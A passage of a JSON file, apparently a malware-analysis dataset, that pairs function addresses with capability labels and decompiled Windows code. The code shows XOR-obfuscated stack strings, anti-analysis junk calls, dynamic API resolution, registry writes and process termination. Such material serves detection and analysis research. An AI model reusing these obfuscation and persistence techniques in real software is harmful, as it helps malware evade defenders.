_sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (param_1 != 0) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, var_10h * 2 + 0x1a);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        if (iVar2 != 0) {\n            var_8h = iVar2;\n            uVar1 = (*pcVar5)(8, var_10h * 2 + 6);\n            hHeap = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            if (hHeap != 0) {\n                (*_sym.imp.KERNEL32.dll_lstrcpyW)(iVar2, lpString2);\n                var_18h = fcn.00409bd3();\n                var_18h = var_18h + 2;\n                var_34h = 0x571d5567;\n                var_30h = 0x717b421e;\n                var_2ch = 0x55236b35;\n                var_10h = 5;\n                var_28h._0_1_ = 5;\n                var_28h._1_2_ = 0x6b57;\n                var_28h._3_1_ = 0x42;\n                var_24h = 0x57715542;\n                var_20h._0_1_ = 0x6b;\n                uVar1 = (*pcVar5)(8, 0x21);\n                iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                iVar4 = 0;\n                var_1ch = iVar2;\n                do {\n                    iVar3 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n                    if (iVar3 != 0xc1fee1) {\n                        *(iVar4 + iVar2) = *(&var_24h + iVar4 % var_10h) ^ (iVar4 + iVar2)[&var_34h - iVar2];\n                    }\n                    iVar4 = iVar4 + 1;\n                } while (iVar4 < 0x10);\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                pcVar5 = _sym.imp.USER32.dll_wsprintfW;\n                (*_sym.imp.USER32.dll_wsprintfW)(var_18h, iVar2, uVar1);\n                (*pcVar5)(hHeap, L\"\\\"%s\\\"\", lpString2);\n                pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                iVar4 = 8;\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x104);\n                lpString2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                if (lpString2 != 0) {\n                    var_14h = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                    var_80h = 0x47230309;\n                    var_7ch = 0x7a570a1e;\n                    var_78h = 0x4455747;\n                    var_74h = 0x481f1877;\n                    var_70h = 0x7a047252;\n                    var_6ch = 0x40724d62;\n                    var_68h = 0x3213627a;\n                    var_64h = 0x524d5759;\n                    var_60h = 0x17d3866;\n                    var_5ch = 0xf507711;\n                    var_58h = 0x15230401;\n                    var_54h = 0x77464d52;\n                    var_50h = 0x181c1852;\n                    var_4ch = 0x65021077;\n                    var_48h = 0x1b50337d;\n                    var_44h._0_2_ = 0x5248;\n                    var_44h._2_1_ = 0x72;\n                    var_44h._3_1_ = 5;\n                    var_40h = 0x627a;\n                    var_3eh = 0x77;\n                    var_24h = 0x35577768;\n                    var_20h._0_1_ = 0x77;\n                    uVar1 = (*pcVar5)(8, 0x44);\n                    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                    iVar4 = 0;\n                    var_18h = &var_80h - iVar3;\n                    do {\n                        iVar2 = (*_sym.imp.ADVAPI32.dll_RevertToSelf)();\n                        if (iVar2 != 0x153f96) {\n                            *(iVar4 + iVar3) = *(&var_24h + iVar4 % var_10h) ^ (iVar4 + iVar3)[&var_80h - iVar3];\n                        }\n                        iVar4 = iVar4 + 1;\n                    } while (iVar4 < 0x43);\n                    uVar1 = var_14h;\n                    nNumberOfBytesToWrite = (*_sym.imp.USER32.dll_wsprintfA)(lpString2, iVar3, var_14h, var_14h);\n                    iVar4 = fcn.00401041(nNumberOfBytesToWrite);\n                    iVar2 = var_1ch;\n                    if (iVar4 == 0) {\n                        iVar4 = fcn.00402913(uVar1);\n                    }\n                    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpString2);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                }\n                uVar1 = (*pcVar5)(0, hHeap);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                uVar1 = (*pcVar5)(0, iVar2);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                iVar2 = var_8h;\n            }\n            uVar1 = (*pcVar5)(0, iVar2);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n        }\n    }\n    return iVar4;\n}\n",
        "token_count": 1762
    },
    "00403435": {
        "rules": [
            "contain obfuscated stackstrings"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00403435(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_24h = 0x221c5c22;\n    var_20h = 0x3f59154c;\n    var_1ch = 0x4c065c23;\n    var_18h._0_1_ = 0x6e;\n    var_14h = 0x566e3574;\n    var_10h._0_1_ = 0x39;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    var_4h = 5;\n    iVar7 = 0;\n    var_ch = iVar4;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_GetKBCodePage)();\n        if (iVar5 != 0xea7637) {\n            *(iVar7 + iVar4) = *(&var_14h + iVar7 % var_4h) ^ (iVar7 + iVar4)[&var_24h - iVar4];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xd);\n    var_24h = 0x1622330d;\n    var_20h = 0x62650a26;\n    var_1ch = 0x3a0a2756;\n    var_18h._0_1_ = 0x50;\n    var_14h = 0x78505666;\n    var_10h._0_1_ = 0x43;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar7 = 0;\n    var_8h = &var_24h - iVar4;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_ReleaseCapture)();\n        iVar5 = var_ch;\n        if (iVar6 != 0xba32d9) {\n            *(iVar7 + iVar4) = *(&var_14h + iVar7 % var_4h) ^ (iVar7 + iVar4)[&var_24h - iVar4];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xd);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar4, var_ch);\n    (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar5);\n    (*pcVar1)(uVar3);\n    return;\n}\n",
        "token_count": 787
    },
    "0040354e": {
        "rules": [
            "contain obfuscated stackstrings"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.0040354e(int32_t param_1)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    code *pcVar6;\n    int32_t iVar7;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = *0x413000;\n    var_14h = param_1;\n    if (*0x41db08 == NULL) {\n        var_4ch = 0x66425e19;\n        var_48h = 0x545f0b43;\n        var_44h = 0x662b1b32;\n        var_40h = 0x7a41275a;\n        var_3ch = 0x12024677;\n        var_38h = 0x3547582a;\n        var_34h = 0x5a583a14;\n        var_30h._0_2_ = 0x773e;\n        var_1ch = 0x5035314e;\n        var_18h._0_1_ = 0x77;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1f);\n        iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        var_8h = 5;\n        iVar7 = 0;\n        var_10h = iVar3;\n        do {\n            iVar4 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n            if (iVar4 != 0xa8cb5d) {\n                *(iVar7 + iVar3) = *(&var_1ch + iVar7 % var_8h) ^ (iVar7 + iVar3)[&var_4ch - iVar3];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0x1e);\n        var_2ch = 0x1622330d;\n        var_28h = 0x62650a26;\n        var_24h = 0x3a0a2756;\n        var_20h._0_1_ = 0x50;\n        var_1ch = 0x78505666;\n        var_18h._0_1_ = 0x43;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n        iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        iVar7 = 0;\n        var_ch = &var_2ch - iVar3;\n        do {\n            iVar5 = (*_sym.imp.USER32.dll_ReleaseCapture)();\n            iVar4 = var_10h;\n            if (iVar5 != 0xba32d9) {\n                *(iVar7 + iVar3) = *(&var_1ch + iVar7 % var_8h) ^ (iVar7 + iVar3)[&var_2ch - iVar3];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0xd);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar3, var_10h);\n        *0x41db08 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n        pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n        pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        uVar2 = (*pcVar1)(0, iVar4);\n        (*pcVar6)(uVar2);\n        pcVar6 = *0x41db08;\n        if (*0x41db08 == NULL) goto code_r0x004036bb;\n    }\n    iVar3 = var_14h;\n    pcVar6 = (**0x41db08)(var_14h);\n    if (pcVar6 != '\\0') {\n        *0x413000 = iVar3 != 0;\n    }\ncode_r0x004036bb:\n    return pcVar6 & 0xffffff00 | var_1h;\n}\n",
        "token_count": 1104
    },
    "00404fc8": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00404fc8(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint var_28h;\n    uint var_22h;\n    uint var_1eh;\n    uint var_1ah;\n    uint var_16h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    \n    var_28h._0_1_ = 0x3c;\n    var_8h = 6;\n    var_28h._1_1_ = 6;\n    stack0xffffffd6 = 0x26221c3f;\n    var_22h = 0x1d22120c;\n    var_1eh._0_2_ = 0x3132;\n    var_1eh._2_1_ = 0x18;\n    var_1ah = 0x3d151633;\n    var_16h._0_2_ = 0x1f08;\n    var_16h._2_1_ = 0x56;\n    var_10h = 0x78567369;\n    var_ch._0_2_ = 0x5461;\n    var_1eh._3_1_ = var_28h._1_1_;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x16);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar6 = 0;\n    do {\n        iVar5 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n        if (iVar5 != 0xf0ec35) {\n            *(iVar6 + iVar4) = *(&var_10h + iVar6 % var_8h) ^ (iVar6 + iVar4)[&var_28h - iVar4];\n        }\n        pcVar2 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x15);\n    iVar6 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(0, iVar4);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    while (iVar6 == 0) {\n        (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n        iVar6 = (*pcVar2)(0, iVar4);\n    }\n    uVar3 = (*pcVar1)(0, iVar4);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    return;\n}\n",
        "token_count": 596
    },
    "004051e7": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuchar * fcn.004051e7(void)\n\n{\n    code *pcVar1;\n    uchar *puVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uchar *puVar7;\n    int32_t iVar8;\n    uchar *puVar9;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uchar var_13h;\n    uchar *var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uchar *var_4h;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_48h = 0x6b217523;\n    var_44h = 0x43114221;\n    var_40h = 0x7524420e;\n    var_3ch = 0x422a6b24;\n    var_38h = 0x4201431c;\n    var_34h = 0x6b2f7529;\n    var_30h = 0x431b422f;\n    var_2ch = 0x75324204;\n    var_28h = 0x42306b32;\n    var_24h = 0x421f4306;\n    var_20h = 0x6b357537;\n    var_1ch = 0x430d4235;\n    var_18h._0_2_ = 0x4212;\n    var_18h._2_1_ = 0x38;\n    stack0xffffffe7 = 0x4375;\n    var_13h = 0x6b;\n    var_10h = 0x6b437542;\n    var_ch._0_1_ = 0x42;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x6d);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar8 = 0;\n    var_8h = &var_48h - iVar4;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_GetInputState)();\n        if (iVar5 != 0x429812) {\n            var_4h = 0x5;\n            *(iVar8 + iVar4) = *(&var_10h + iVar8 % 5) ^ (iVar8 + iVar4)[var_8h];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x36);\n    uVar6 = fcn.00405094();\n    puVar7 = uVar6 % 0x38 + 8;\n    var_10h = puVar7;\n    if (puVar7 != NULL) {\n        var_8h = puVar7 * 2 + 2;\n        uVar3 = (*pcVar1)(8, var_8h);\n        puVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        puVar2 = var_10h;\n        if (puVar7 != NULL) {\n            var_4h = NULL;\n            puVar9 = puVar7;\n            for (iVar8 = var_8h; iVar8 != 0; iVar8 = iVar8 + -1) {\n                *puVar9 = 0;\n                puVar9 = puVar9 + 1;\n            }\n            if (var_10h != NULL) {\n                do {\n                    iVar8 = fcn.00405094();\n                    *(puVar7 + var_4h * 2) = *(iVar4 + (iVar8 % 0x1a) * 2);\n                    var_4h = var_4h + 1;\n                } while (var_4h < puVar2);\n            }\n            *(puVar7 + puVar2 * 2) = 0;\n        }\n    }\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    return puVar7;\n}\n",
        "token_count": 998
    },
    "00405981": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop",
            "set environment variable",
            "terminate process"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00405981(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_28h;\n    uint var_24h;\n    uint var_1fh;\n    uint var_1bh;\n    uint var_17h;\n    uint var_13h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    fcn.00408946();\n    (*_sym.imp.KERNEL32.dll_TerminateProcess)(*0x41dbb8, 0);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(*0x41ddd4);\n    var_28h = 0x493d5a58;\n    var_4h = 5;\n    var_24h._0_1_ = 5;\n    stack0xffffffd9 = 0x314e3f35;\n    var_1fh = 0x2d5a506c;\n    var_1bh = 0x3f354249;\n    var_17h = 0x506c314e;\n    var_13h._0_2_ = 0x4e5a;\n    var_13h._2_1_ = 0x49;\n    stack0xffffffec = 0x494e5a35;\n    var_ch._0_1_ = 0x6c;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x31);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar5 = 0;\n    var_8h = iVar3;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetClipboardViewer)();\n        if (iVar4 != 0xf50818) {\n            *(iVar5 + iVar3) = *(&var_13h + iVar5 % var_4h + 3) ^ (iVar5 + iVar3)[&var_28h - iVar3];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x18);\n    uVar2 = fcn.0040182f(0);\n    (*_sym.imp.KERNEL32.dll_SetEnvironmentVariableW)(uVar2);\n    fcn.00409690();\n    (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 569
    },
    "00406361": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop",
            "set registry value"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00406361(void)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    uint uVar3;\n    int16_t *piVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    code *pcVar7;\n    int32_t iVar8;\n    uint var_bch;\n    uint var_b8h;\n    int16_t *var_b4h;\n    int16_t *var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    int32_t hKey;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    int32_t var_3ch;\n    int32_t var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int16_t *var_8h;\n    uint var_4h;\n    \n    var_bch = 1;\n    var_34h = 0x78306f32;\n    var_30h = 0x550e7634;\n    var_2ch = 0x6f1a520d;\n    var_28h = 0x761b7821;\n    var_24h = 0x520b5501;\n    var_20h = 0x78346f02;\n    var_1ch = 0x5503763e;\n    var_18h._0_2_ = 0x5278;\n    var_44h = 0x78556f76;\n    var_40h._0_1_ = 0x52;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x3d);\n    piVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    var_38h = 5;\n    var_b8h = 0;\n    iVar8 = 0;\n    var_b0h = piVar4;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_CloseClipboard)();\n        if (iVar5 != 0x3ff85) {\n            *(iVar8 + piVar4) = *(&var_44h + iVar8 % var_38h) ^ (iVar8 + piVar4)[&var_34h - piVar4];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x1e);\n    var_ach = 0x6e2d311e;\n    var_a8h = 0x42454d57;\n    var_a4h = 0x312c3119;\n    var_a0h = 0x4d546e30;\n    var_9ch = 0x3123426d;\n    var_98h = 0x6e213124;\n    var_94h = 0x425e4d43;\n    var_90h = 0x3122311d;\n    var_8ch = 0x4d456e24;\n    var_88h = 0x3127426d;\n    var_84h = 0x6e033108;\n    var_80h = 0x426d4d7a;\n    var_7ch = 0x313f3129;\n    var_78h = 0x4d446e2d;\n    var_74h = 0x313e4241;\n    var_70h = 0x6e2e3122;\n    var_6ch = 0x42524d58;\n    var_68h = 0x31113117;\n    var_64h = 0x4d546e12;\n    var_60h = 0x310a425f;\n    var_5ch = 0x6e2c3124;\n    var_58h = 0x42764d56;\n    var_54h = 0x3102313e;\n    var_50h = 0x4d316e31;\n    var_8h = 0x6e42314d;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x31);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc1);\n    iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_44h = iVar8;\n    var_3ch = &var_ach - iVar8;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetMessagePos)();\n        if (iVar6 != 0x658949) {\n            *(iVar5 + iVar8) = *(&var_8h + iVar5 % var_38h) ^ (iVar5 + iVar8)[&var_ach - iVar8];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x60);\n    hKey = fcn.0040fdaa(0x20006);\n    pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (hKey != 0) {\n        var_14h = 0x743d5409;\n        var_10h = 0x5424413c;\n        var_ch = 0x41497426;\n        var_8h = 0x7452544a;\n        var_4h._0_2_ = 0x4149;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n        iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        var_38h = 6;\n        iVar5 = 0;\n        var_48h = &var_14h - iVar8;\n        var_3ch = iVar8;\n        do {\n            iVar6 = (*_sym.imp.USER32.dll_GetOpenClipboardWindow)();\n            if (iVar6 != 0xff2c46) {\n                *(iVar5 + iVar8) = *(&var_8h + iVar5 % var_38h) ^ (iVar5 + iVar8)[&var_14h - iVar8];\n            }\n            iVar5 = iVar5 + 1;\n        } while (iVar5 < 0xc);\n        var_24h = 0x68585066;\n        var_20h = 0x505e634d;\n        var_1ch = 0x63396808;\n        var_10h = 0x68395036;\n        var_ch = CONCAT22(var_ch._2_2_, 0x6339);\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n        iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar5 = 0;\n        var_48h = &var_24h - iVar8;\n        var_8h = iVar8;\n        do {\n            iVar6 = (*_sym.imp.USER32.dll_GetMessageExtraInfo)();\n            if (iVar6 != 0x7b7be5) {\n                *(iVar5 + iVar8) = *(&var_10h + iVar5 % var_38h) ^ (iVar5 + iVar8)[&var_24h - iVar8];\n            }\n            iVar5 = iVar5 + 1;\n        } while (iVar5 < 0xc);\n        var_28h = 0x463f3125;\n        var_24h = 0x31025434;\n        var_20h = 0x54384633;\n        var_1ch = 0x466b3118;\n        var_18h._0_2_ = 0x5457;\n        var_10h = 0x465a3176;\n        var_ch = CONCAT22(var_ch._2_2_, 0x5457);\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x25);\n        iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar5 = 0;\n        var_48h = &var_28h - iVar8;\n        do {\n            iVar6 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n            if (iVar6 != 0x16f283) {\n                *(iVar5 + iVar8) = *(&var_10h + iVar5 % var_38h) ^ (iVar5 + iVar8)[&var_28h - iVar8];\n            }\n            pcVar7 = _sym.imp.ADVAPI32.dll_RegSetValueExW;\n            iVar5 = iVar5 + 1;\n        } while (iVar5 < 0x12);\n        (*_sym.imp.ADVAPI32.dll_RegSetValueExW)(hKey, var_3ch, 0, 4, &var_bch, 4);\n        iVar5 = var_8h;\n        piVar4 = var_b4h;\n        do {\n            iVar1 = *piVar4;\n            piVar4 = piVar4 + 1;\n        } while (iVar1 != var_b8h);\n        (*pcVar7)(hKey, var_8h, 0, 1, var_b4h, (piVar4 - (var_b4h + 1) >> 1) * 2);\n        var_8h = var_b0h + 1;\n        piVar4 = var_b0h;\n        do {\n            iVar1 = *piVar4;\n            piVar4 = piVar4 + 1;\n        } while (iVar1 != var_b8h);\n        (*pcVar7)(hKey, iVar8, 0, 1, var_b0h, (piVar4 - var_8h >> 1) * 2);\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n        pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar8);\n        pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        uVar3 = (*pcVar7)(0, iVar5);\n        (*pcVar2)(uVar3);\n        uVar3 = (*pcVar7)(0, var_3ch);\n        (*pcVar2)(uVar3);\n        iVar8 = var_44h;\n    }\n    piVar4 = var_b0h;\n    uVar3 = (*pcVar7)(0, iVar8);\n    pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    uVar3 = (*pcVar7)(0, piVar4);\n    (*pcVar2)(uVar3);\n    return 1;\n}\n",
        "token_count": 2623
    },
    "0040840d": {
        "rules": [
            "contain obfuscated stackstrings",
            "query environment variable",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040840d(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    uint lpString;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_18h = 0x57194b55;\n    var_14h = 0x56532f20;\n    var_10h = 0x2d275b14;\n    var_ch._0_1_ = 0x36;\n    puVar5 = &lpString;\n    for (iVar4 = 0x104; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    var_20h = 0;\n    var_8h = 0x34783936;\n    var_4h._0_2_ = 0x424b;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar6 = 0;\n    do {\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n        if (iVar2 != 0xabe8f7) {\n            var_1ch = 6;\n            *(iVar6 + iVar4) = *(&var_8h + iVar6 % 6) ^ (iVar6 + iVar4)[&var_18h - iVar4];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0xd);\n    iVar6 = (*_sym.imp.KERNEL32.dll_GetEnvironmentVariableA)(iVar4, &lpString, 0x104);\n    uVar1 = var_20h;\n    if (iVar6 != 0) {\n        (*_sym.imp.KERNEL32.dll_lstrlenA)(&lpString);\n        iVar6 = fcn.0040918d();\n        if (iVar6 == -0x69b4c9f2) {\n            uVar1 = 1;\n        }\n    }\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    return uVar1;\n}\n",
        "token_count": 585
    },
    "00409827": {
        "rules": [
            "contain obfuscated stackstrings"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.00409827(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint *var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint hObject;\n    int32_t StringSid;\n    uint dwBytes;\n    \n    iVar6 = 0;\n    dwBytes = 0;\n    hObject = 0;\n    StringSid = 0;\n    var_14h = 0;\n    (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(8, &hObject);\n    iVar3 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar2);\n    pcVar1 = _sym.imp.ADVAPI32.dll_GetTokenInformation;\n    if (iVar3 != 0) {\n        (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(hObject, 1, 0, dwBytes, &dwBytes);\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if ((iVar3 == 0x7a) &&\n           (puVar4 = (*_sym.imp.KERNEL32.dll_GlobalAlloc)(0x40, dwBytes),  var_18h = puVar4,  puVar4 != NULL)) {\n            iVar3 = (*pcVar1)(hObject, 1, puVar4, dwBytes, &dwBytes);\n            if ((iVar3 != 0) &&\n               ((iVar3 = (*_sym.imp.ADVAPI32.dll_ConvertSidToStringSidW)(*puVar4, 